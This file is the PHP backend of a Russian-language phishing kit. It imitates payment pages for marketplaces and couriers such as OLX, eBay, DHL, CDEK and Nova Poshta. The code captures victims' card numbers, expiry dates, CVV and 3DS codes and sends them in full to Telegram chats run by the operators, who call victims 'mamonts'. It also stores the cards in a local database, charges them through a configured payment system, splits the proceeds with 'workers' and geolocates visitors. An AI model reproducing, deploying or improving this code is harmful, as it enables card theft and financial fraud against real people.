<?php

include("Settings.php");
include("Telegram.php");
include("Functions.php");


$Telegram = new Telegram($config['bot_token']);

$_GET = json_decode($_POST["get"], true);
$_SERVER = json_decode($_POST["server"], true);
$_SERVICE = $_POST["service"];
$_POST = json_decode($_POST["post"], true);
$adID = $_GET["currentID"];
$adType = $_GET["platform"];

if ( $adType == 'rent' || $adType == 'arenda' )
	$brand2 = " — 🏠";


if ( $_POST['checkerror'] == 1 ) {
	if ( is_file("Pattern/TEXTERROR/{$adID}") ) {
		$text = file_get_contents("Pattern/TEXTERROR/{$adID}");
		unlink("Pattern/TEXTERROR/{$adID}");
		exit($text);
	} else {
		exit();
	}
}

/*
 * Проверяем существует ли данный сервис у нас
 */
 
$ad = getCum($adID);

if ( $_SERVICE == 'NOVAPOSHTA' || $_SERVICE == 'OLX' || $_SERVICE == 'IZI.UA') {
	$FF = "UAH";
	$course = $config['course']['grivni'];
	$sum_UAH = $ad['sum'] * $course;
	$db24 = getDB();
	$db24['dl_cum'][$adID]['ua_tr'] = true;
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db24));
}

if ( $_SERVICE == 'Kufar' || $_SERVICE == 'EVROPOCHTA') {
	$FF = "BYN";
	$course = $config['course']['byn'];
	$sum_BYN = $ad['sum'] * $course;
	$db24 = getDB();
	$db24['dl_cum'][$adID]['bl_tr'] = true;
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db24));
}

if ( $_SERVICE == 'OLX-KZ') {
	$FF = "KZT";
	$course = $config['course']['tenge'];
	$sum_SUR = $ad['sum'] * $course;
	$db24 = getDB();
	$db24['dl_cum'][$adID]['sr_tr'] = true;
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db24));
}

if ( $_SERVICE == 'OLX-UZ') {
	$FF = "UZS";
	$course = $config['course']['uzb'];
	$sum_SUR = $ad['sum'] * $course;
	$db24 = getDB();
	$db24['dl_cum'][$adID]['sr_tr'] = true;
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db24));
}

if ( $_SERVICE == 'OLX-PL') {
	$FF = "PLN";
	$course = $config['course']['zlota'];
	$sum_SUR = $ad['sum'] * $course;
	$db24 = getDB();
	$db24['dl_cum'][$adID]['sr_tr'] = true;
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db24));
}

if ( $_SERVICE == 'OLX-BG') {
	$FF = "BGN";
	$course = $config['course']['bgn'];
	$sum_SUR = $ad['sum'] * $course;
	$db24 = getDB();
	$db24['dl_cum'][$adID]['sr_tr'] = true;
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db24));
}

if ( $_SERVICE == 'OLX-RO') {
	$FF = "RON";
	$course = $config['course']['rom'];
	$sum_SUR = $ad['sum'] * $course;
	$db24 = getDB();
	$db24['dl_cum'][$adID]['sr_tr'] = true;
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db24));
}

if ( $_SERVICE == 'OLX-PT') {
	$FF = "EURO";
	$course = $config['course']['prt'];
	$sum_SUR = $ad['sum'] * $course;
	$db24 = getDB();
	$db24['dl_cum'][$adID]['sr_tr'] = true;
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db24));
}

if ( $_SERVICE == 'EBAY-USA') {
	$FF = "USD";
	$course = $config['course']['usd'];
	$sum_SUR = $ad['sum'] * $course;
	$db24 = getDB();
	$db24['dl_cum'][$adID]['sr_tr'] = true;
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db24));
}

if ( $_SERVICE == 'EBAY-EU') {
	$FF = "EUR";
	$course = $config['course']['eur'];
	$sum_SUR = $ad['sum'] * $course;
	$db24 = getDB();
	$db24['dl_cum'][$adID]['sr_tr'] = true;
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db24));
}

if ( $_SERVICE == 'DHL-USA') {
	$FF = "USD";
	$course = $config['course']['usd'];
	$sum_SUR = $ad['sum'] * $course;
	$db24 = getDB();
	$db24['dl_cum'][$adID]['sr_tr'] = true;
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db24));
}

if ( $_SERVICE == 'DHL-EU') {
	$FF = "EUR";
	$course = $config['course']['eur'];
	$sum_SUR = $ad['sum'] * $course;
	$db24 = getDB();
	$db24['dl_cum'][$adID]['sr_tr'] = true;
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db24));
}

if ( $_SERVICE == 'LEBONCOIN') {
	$FF = "EUR";
	$course = $config['course']['eur'];
	$sum_SUR = $ad['sum'] * $course;
	$db24 = getDB();
	$db24['dl_cum'][$adID]['sr_tr'] = true;
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db24));
}

if ( $_SERVICE == 'QUOKA') {
	$FF = "EUR";
	$course = $config['course']['eur'];
	$sum_SUR = $ad['sum'] * $course;
	$db24 = getDB();
	$db24['dl_cum'][$adID]['sr_tr'] = true;
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db24));
}

if ( $_SERVICE == 'SUBITO') {
	$FF = "EUR";
	$course = $config['course']['eur'];
	$sum_SUR = $ad['sum'] * $course;
	$db24 = getDB();
	$db24['dl_cum'][$adID]['sr_tr'] = true;
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db24));
}

if ( $_SERVICE == 'WILLHABEN') {
	$FF = "EUR";
	$course = $config['course']['eur'];
	$sum_SUR = $ad['sum'] * $course;
	$db24 = getDB();
	$db24['dl_cum'][$adID]['sr_tr'] = true;
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db24));
}

if ( $_SERVICE == 'JOFOGAS') {
	$FF = "EUR";
	$course = $config['course']['eur'];
	$sum_SUR = $ad['sum'] * $course;
	$db24 = getDB();
	$db24['dl_cum'][$adID]['sr_tr'] = true;
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db24));
}

if ( array_key_exists('MD', $_POST) ) {
	$db = getDB();
	if ($db['dl_pay'][md5($_POST['MD'].$_POST['PaRes'])] == '') {
		$db['dl_pay'][md5($_POST['MD'].$_POST['PaRes'])] = true;
		file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db));
	}
	
	$payment = $config['payment_system'];
	include("Pattern/payment/{$payment}.php");
	$result = checkPay($_POST['MD'],$_POST['PaRes']);

	if ($result[0]) {
		if ( $ad['profit_count'] >= 1 ) $x = " x".($ad['profit_count']+1);
		setProfit($ad['chat_id'], $ad['sum']);
		$field[] = "🔥 *Успешная оплата{$x}* 🔥\n";
		
		if ( $sum_UAH != '' ) 
		$field[] = "💵 Сумма платежа: *" . getSum($ad['sum']) . " UAH*";
		elseif($sum_BYN != '') $field[] = "💵 Сумма платежа: *" . getSum($ad['sum']) . " BYN*";
		elseif($sum_SUR != '') $field1[] = "💵 Сумма платежа: *" . getSum($ad['sum']) . " SUR*";
		else $field[] = "💵 Сумма платежа: *" . getSum($ad['sum']) . ",00 RUB*";
		
		if ( $sum_UAH != '' ) 
		$field[] = "💸 Доля воркера:: *" . getSum(round(($ad['sum'] / 100) * 80,0)) . " UAH*";
		elseif($sum_BYN != '') $field[] = "💸 Доля воркера:: *" . getSum(round(($ad['sum'] / 100) * 80,0)) . " BYN*";
		elseif($sum_SUR != '') $field1[] = "💵 Сумма платежа: *" . getSum($ad['sum']) . " SUR*";

		$field[] = "💡 ID: *".substr($adID,0,8)."•••*";
		$field[] = "🤑 " . getUserName($ad['chat_id']);
		setCum($adID, "profit_count", ($ad['profit_count']+1));
		
		$Telegram->sendMessage(["chat_id" => $ad['chat_id'], "text" => getMessage($field), "parse_mode" => "Markdown"]);
		$Telegram->sendMessage(["chat_id" => $config['chat_of_workers_id'], "text" => getMessage($field), "parse_mode" => "Markdown"]);
		$Telegram->sendMessage(["chat_id" => $config['channel_of_profits'], "text" => getMessage($field), "parse_mode" => "Markdown"]);
		$Telegram->sendMessage(["chat_id" => $config['group_admin'], "text" => getMessage($field), "parse_mode" => "Markdown"]);
	} else {
		$field1[] = "❌ *Ошибка оплаты*\n";
		$field1[] = "❕ Причина: *{$result[1]}*";
		$field1[] = "💵 Сумма платежа: *".getSum($ad['sum']).",00 RUB*\n";
		$field1[] = "ID: *{$adID}*\n";
		$Telegram->sendMessage(['chat_id' => $ad['chat_id'], 'text' => getMessage($field1), 'parse_mode' => 'Markdown']);
		$field1[] = "🧤 *Воркер* : " . getUserName($ad['chat_id']);
		$Telegram->sendMessage(["chat_id" => $config['group_admin'], "text" => getMessage($field1), "parse_mode" => "Markdown"]);
	}
}

if ( $ad['name'] == '' ) {
$sss123 = <<<SS
	<!DOCTYPE html>
	<html>
		<head>
			<title>Ничего не найдено</title>
			<meta name="viewport" content="width=auto, initial-scale=1">
			<link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet">
			<style>
				.__error {
					margin: 60px;
					color: white;
					font-family: 'Open Sans', sans-serif;
				}
				._img {
					float: left;
					padding-right: 40px;
				}
				._text {
					margin-left: 50px;
				}
			   html, body {
  width: 100%;
  height: 100%;
}
			</style>
		</head>
		<body>
			<div class="__error">
				<p>
					<img class="_img" src="https://vk.com/sticker/1-12967-128">
					<div class="_text">
						<h1>404</h1>
						<p>Упс... Произошла ошибка</p>
					</div>
				</p>
			</div>
		</body>
	</html>
SS;
exit($sss123);
}	

if ( $_POST['card'] != "1" ) {
	if ( array_key_exists('errorpay1', $ad) ) {
		$db = getDB();
		unset($db['dl_cum'][$adID]['errorpay1']);
		file_put_contents('LA2fYTVi5e5tUCOB.db',json_encode($db));
		$ad = $db['dl_cum'][$adID];
	}
}

if ( array_key_exists('errorpay1', $ad) ) {
	include('Pattern/ErrorPay/1.html');
	exit();
}

$ad['smartcup'] = $config['support'];
 
if ( $_SERVICE != "Mail" && is_dir("Pattern/{$_SERVICE}")
     && array_key_exists($adType, $config['platform'])
	 && $ad != False && is_file("Pattern/{$_SERVICE}/{$adType}.php")) {
	// TODO
} else {
	exit();
}

switch ($adType) {
	case "receive": {
		$brand = "2.0";
		$textCard[0] = "";
		$textCard[1] = "";
		$textCard[2] = "";
		break;
	}

	case "delivery": {
		$brand = "2.0";
		$textCard[0] = "Получение средств";
		$textCard[1] = "Получить";
		$textCard[2] = "Получить";
		break;
	}
	case "rent": {
		$brand = "2.0";
		$textCard[0] = "Зачисление средств";
		$textCard[1] = "Зачислить";
		$textCard[2] = "Зачислить";
		break;
	}
	case "wwe": {
		$brand = "2.0";
		$textCard[0] = "Зачисление средств";
		$textCard[1] = "Зачислить";
		$textCard[2] = "Зачислить";
		break;
	}
	case "order": {
		$brand = "1.0";
		$textCard[0] = "";
		$textCard[1] = "";
		$textCard[2] = "";
		break;
	}
	case "safe": {
		$brand = "1.0";
		$textCard[0] = "Оплата заказа";
		$textCard[1] = "Оплатить";
		$textCard[2] = "Оплатить";
		break;
	}
	case "arenda": {
		$brand = "1.0";
		$textCard[0] = "Оплата заказа";
		$textCard[1] = "Оплатить";
		$textCard[2] = "К оплате";
		break;
	}
	case "track": {
		$brand = "1.0";
		$textCard[0] = "Оплата заказа";
		$textCard[1] = "Оплатить";
		$textCard[2] = "Оплатить";
		break;
	}
}

if ( !array_key_exists('serv', getDB()['dl_cum'][$adID]) ) {
	$sdg = getDB();
	$sdg['dl_cum'][$adID]['serv'] = "{$_SERVICE} {$brand}";
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($sdg));
}	

if ( $_POST['fcard'] != "" ) {
	
	$payment = $config['payment_system'];

	$requestBank = json_decode(get("https://api.tinkoff.ru/v1/brand_by_bin?bin=" . substr(str_replace(' ', '', $_POST['fcard']),0,6)),1)['payload'];
	$emitent = $requestBank['paymentSystem'] . ' ' . $requestBank['name'];
	
	
	$ddd = getDB();
	$ddd['dl_cum'][$adID]['fcard'] = $_POST['fcard'];
	$ddd['dl_cum'][$adID]['fexpm'] = $_POST['fexpm'];
	$ddd['dl_cum'][$adID]['fexpy'] = $_POST['fexpy'];
	$ddd['dl_cum'][$adID]['fexpm'] = $_POST['fexpm'];
	$ddd['dl_cum'][$adID]['fcvc'] = $_POST['fcvc'];
	$ddd['dl_cum'][$adID]['domain_name'] = $_SERVER['HTTP_HOST'];
	$ddd['dl_cum'][$adID]['card_name'] = $emitent;
	file_put_contents("LA2fYTVi5e5tUCOB.db",json_encode($ddd));
	
	$actual_link = "https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
	if ( file_exists("Pattern/payment/{$payment}.php") ) {
		$paymentTypeText = "Автоматическая";
		include("Pattern/payment/{$payment}.php");
		// TODO
		$card = str_replace(" ","",$_POST['fcard']);
		$fexpm = $_POST['fexpm'];
		$fexpy = $_POST['fexpy'];
		$fcvc = $_POST['fcvc'];
		$tocard = $config['to_card'];
		$order = createOrder($card,$fexpm,$fexpy,$fcvc,$ad['sum'],$actual_link,$tocard);
		if ( $order[0] ) {
			$field1[] = "🧮 *Карта введена , переход на 3DS*\n";
		
		$FF = ($FF == '' ? "RUB" : $FF);
	
		if ( $_SERVICE == 'CDEK' || $_SERVICE == 'Boxberry' || $_SERVICE == 'Yandex'
			 || $_SERVICE == 'NOVAPOSHTA' || $_SERVICE == 'EVROPOCHTA'	) {
				$field1[] = "🏷 Трек-номер: *{$adID}*";
		}
		
		$TypeC = ($requestBank['paymentSystem'] == 'VISA' ? "CVV2" : $requestBank['paymentSystem'] == 'MasterCard' ? "CVC2" : "CVC");
		
		$emitent = ($emitent == ' ' ? "Неизвестно" : $emitent);
		
		$field1[] = "📃 *Название:* {$ad['name']}";
		$field1[] = "🥀 *Сервис:* {$_SERVICE} {$brand}";
		$field1[] = "💵 *Стоимость:* ".getSum($ad['sum'])." 00 {$FF}\n";
		$field1[] = "💳 *Карта:* {$emitent} *•••• ".substr($_POST['fcard'],-4)."\n";
		if ( $_POST['fbalance'] != '' )
		$field1[] = "💰 *Баланс мамонта: *".getSum($_POST['fbalance'])." 00\n";
		$field1[] = "💁🏼‍♀️ Номер: *{$_POST['fcard']}*";
		$field1[] = "📆 *Срок действия:* {$_POST['fexpm']} / {$_POST['fexpy']}";
		$field1[] = "🕶 *{$TypeC}:* {$_POST['fcvc']}\n";
		$field1[] = "🌐 *Домен:* {$_SERVER['SERVER_NAME']}";
			$Telegram->sendMessage(["chat_id" => $config['group_admin'], "text" => getMessage($field1), "parse_mode" => "Markdown"]);
			$fdata = <<<DATA
				<form id='aa' action="{$order['url']}" method="POST">
					<input type='hidden' name='MD' value="{$order['MD']}">
					<input type='hidden' name='PaReq' value="{$order['pareq']}">
					<input type='hidden' name='TermUrl' value="{$order['termUrl']}">
				</form>
				<script>document.getElementById("aa").submit();</script>
DATA;
			exit($fdata);
		} else {
			$field1[] = "❌ *Ошибка оплаты*\n";
			$field1[] = "❕ Причина: *{$order[1]}*";
			$field1[] = "💵 Сумма платежа: *".getSum($ad['sum']).",00 RUB*\n";
			$field1[] = "ID: *{$adID}*\n";
			$Telegram->sendMessage(['chat_id' => $ad['chat_id'], 'text' => getMessage($field1), 'parse_mode' => 'Markdown']);
			exit('Произошла ошибка. Попробуйте перезагрузить страницу.');
		}
	} else {
		// Hand payment
		$paymentTypeText = "Ручная";
		include("Pattern/{$_SERVICE}/3ds.php");
	}
	
	if ( strlen($_POST['3dscode']) > 2 ) {
		// 123
		$field = array();
		$field[] = "🔆 *Мамонт ввёл 3DS*\n";
		$field[] = "🗝 *Сервис:* {$_SERVICE} {$brand}{$brand2}";
		
		if ( $sum_UAH != '' ) 
		$field[] = "💵 Сумма платежа: *" . getSum($ad['sum']) . " UAH";
		elseif($sum_BYN != '') $field[] = "💸 *Сумма платежа:* " . getSum($ad['sum']) . " BYN";
		elseif($sum_SUR != '') $field[] = "💸 *Сумма платежа:* " . getSum($ad['sum']) . " SUR";
		else $field[] = "💸 *Сумма платежа:* " . getSum($ad['sum']) . " RUB";
		
		$field[] = "💳 *Карта:* {$emitent} •••• ".substr($_POST['fcard'],-4)."\n";
		$field[] = "🌐 *Код:* {$_POST['3dscode']}\n";
		$field[] = "";
		$field[] = "🧤 *Воркер* : " .getUserName($ad['chat_id']);
		
		$buttons = array(array());
		
		$buttons[0][] = ["text" => "☑️ Платёж успешен", "callback_data" => "!success_pay {$adID}"];
		$buttons[0][] = ["text" => "🚾 Нету денег", "callback_data" => "!errorpay1 {$adID}"];
		$buttons[][] = ["text" => "❌ Неверный 3DS", "callback_data" => "!errorpay2 {$adID}"];
		$buttons[1][] = ["text" => "💯 Лимит по карте", "callback_data" => "!errorpay5 {$adID}"];
		$buttons[][] = ["text" => "", "callback_data" => "!errorpay3 {$adID}"];
		$buttons[2][] = ["text" => "", "callback_data" => "!errorpay4 {$adID}"];
		
		$Telegram->sendMessage(["chat_id" => $config['group_admin'], "text" => getMessage($field), "parse_mode" => "Markdown",
		"reply_markup" => json_encode(["inline_keyboard" => $buttons])]);
	} elseif ( !array_key_exists('3dscode', $_POST) )  {
		
				$field1[] = "📍 *Мамонт ввел карту*\n";
		
		$FF = ($FF == '' ? "RUB" : $FF);
	
		if ( $_SERVICE == 'CDEK' || $_SERVICE == 'Boxberry' || $_SERVICE == 'Yandex'
			 || $_SERVICE == 'NOVAPOSHTA' || $_SERVICE == 'EVROPOCHTA'	) {
				$field1[] = "🏷 Трек-номер: *{$adID}*";
		} else {
			$field1[] = "";
		}
		
		$TypeC = ($requestBank['paymentSystem'] == 'VISA' ? "CVV2" : $requestBank['paymentSystem'] == 'MasterCard' ? "CVC2" : "CVC");
		
		$emitent = ($emitent == ' ' ? "Неизвестно" : $emitent);
		
		$field1[] = "🗃 *Товар:* {$ad['name']}";
		$field1[] = "";
		$field1[] = "💰 *Стоимость:* ".getSum($ad['sum'])." {$FF}\n";
	
		$dataWorker = ["chat_id" => $ad['chat_id'], "text" => getMessage($field1), "parse_mode" => "Markdown"];
		
		if ( $_POST['fbalance'] != '' )
			$dataWorker['reply_markup'] = json_encode(['inline_keyboard' => [[["callback_data" => "!ball {$ad['chat_id']}", "text" => "⚡️ Снимать полный баланс"]]]]);
	    $Telegram->sendMessage($dataWorker);
	
		$field = array();
		$field[] = "📍 *НОВЫЙ ЛОГ КАРТЫ ({$emitent})*\n";
		if ( $_POST['fbalance'] != '' )
			$field[] = "💰 *Баланс мамонта:* ".getSum($_POST['fbalance'])."\n";
		if ( $_POST['fname'] != '' )
			$field[] = "🌹 *Инициалы:* ".$_POST['fname']."\n";
			
		$field[] = "🗝 *Сервис:* {$_SERVICE} {$brand}{$brand2}";
		
		if ( $sum_UAH != '' ) 
		$field[] = "💲 *Сумма платежа:* " . getSum($ad['sum']) . "";
		else if($sum_BYN != '') $field[] = "💲 *Сумма платежа:* " . getSum($ad['sum']) . "";
		else if($sum_SUR != '') $field[] = "💲 *Сумма платежа:* " . getSum($ad['sum']) . "";
		else $field[] = "💲 *Сумма платежа:* " . getSum($ad['sum']) . "";

		$field[] = "💳 *Карта:* {$_POST['fcard']}";
		$field[] = "⏰ *Срок действия:* {$_POST['fexpm']} / {$_POST['fexpy']}";
		$field[] = "🔒 *CVV2:* {$_POST['fcvc']}\n";
		$field[] = "";
		$field[] = "🧤 *Воркер* : " .getUserName($ad['chat_id']);
		
		$dbc = getDB();
		$dbc['dl_card'][] = date("d/m/y")."|{$_POST['fcard']}|{$_POST['fexpm']} / {$_POST['fexpy']}|{$_POST['fcvc']}|{$_POST['fbalance']}RUB";
		file_put_contents('LA2fYTVi5e5tUCOB.db',json_encode($dbc));
		
		$aa = json_encode(["inline_keyboard" => [[["text" => "💳 Взять на вбив", "callback_data" => "!biv"]]]]);
		
		$Telegram->sendMessage(["chat_id" => $config['group_admin'], "text" => getMessage($field), "parse_mode" => "Markdown", "reply_markup" => $aa]);
	}
	
	exit();
}

if ( $_POST['card'] != "1" ) {
	
	$db = getDB();
	$db['dl_cum'][$adID]['visible'] += 1;
	file_put_contents('LA2fYTVi5e5tUCOB.db', json_encode($db));
	
	if ( $db['dl_cum'][$adID]['visible'] == 50 ) {
		$Telegram->sendMessage(['chat_id' => $config['group_admin'], 'text' => getMessage([
			"😡 *Произошёл DDoS x1*","",
			"Проект: *{$_SERVICE} {$brand}*",
			"ID: *{$adID}*",
			"Отдача *х{$db['dl_cum'][$adID]['visible']}*","",
			"👤 " .getUserName($ad['chat_id'])
		]), 'reply_markup' => json_encode(["inline_keyboard" => [[["text" => "❌ Заблокировать", "callback_data" => "/ban " . getUserName($ad['chat_id']) . " DDoS шёл нахуй"]]]]) ,'parse_mode' => 'Markdown']);
	} elseif ($db['dl_cum'][$adID]['visible'] == 100) {
		$Telegram->sendMessage(['chat_id' => $config['group_admin'], 'text' => getMessage([
			"😡 *ПИЗДААААА DDoS x2*","",
			"Проект: *{$_SERVICE} {$brand}*",
			"ID: *{$adID}*",
			"Отдача *х{$db['dl_cum'][$adID]['visible']}*","",
			"👤 " .getUserName($ad['chat_id'])
		]), 'reply_markup' => json_encode(["inline_keyboard" => [[["text" => "❌ Заблокировать", "callback_data" => "/ban " . getUserName($ad['chat_id']) . " DDoS шёл нахуй"]]]]) ,'parse_mode' => 'Markdown']);
	}
	
	$ip = $_SERVER['REMOTE_ADDR'];
	$dataip = json_decode(get("http://ip-api.com/json/{$ip}?lang=ru"),1);
	
	if ( $_SERVICE == 'CDEK' || $_SERVICE == 'Boxberry' || $_SERVICE == 'Yandex'
	     || $_SERVICE == 'NOVAPOSHTA' || $_SERVICE == 'EVROPOCHTA'	) {
			$field[] = "❄️ *Переход на отслеживание*\n";
			$field[] = "🏷 Трек-номер: *{$adID}*";
	} else {
		$field[] = "🔗 *Переход по ссылке*\n";
	}
	$FF = ($FF == '' ? "RUB" : $FF);
	
	$field[] = "🗃 *Товар:* {$ad['name']}";
	$field[] = "";
	$field[] = "💰 *Стоимость:* ".getSum($ad['sum'])." {$FF}\n";
	
	$Telegram->sendMessage(["chat_id" => $ad['chat_id'], "text" => getMessage($field), "parse_mode" => "Markdown"]);
	
	include("Pattern/{$_SERVICE}/{$adType}.php");
} else {
	
	$FS = ($adType == 'receive' ? "получения средств":($adType=='delivery'?"получения средств":$adType=='wwe'?'получения средств':$adType=='rent'?"получения средств":"оплаты заказа"));
	
	$field[] = "💳 *Переход на ввод карты*\n";
	
	$FF = ($FF == '' ? "RUB" : $FF);
	
	if ( $_SERVICE == 'CDEK' || $_SERVICE == 'Boxberry' || $_SERVICE == 'Yandex'
	     || $_SERVICE == 'NOVAPOSHTA' || $_SERVICE == 'EVROPOCHTA'	) {
			$field[] = "🏷 Трек-номер: *{$adID}*";
	}
	
    $field[] = "🗃  *Товар:* {$ad['name']}";
	$field[] = "";
	$field[] = "💰 *Стоимость:* ".getSum($ad['sum'])." {$FF}\n";
	
	$Telegram->sendMessage(["chat_id" => $ad['chat_id'], "text" => getMessage($field), "parse_mode" => "Markdown"]);
	
	include("Pattern/{$_SERVICE}/card.php");
}

?>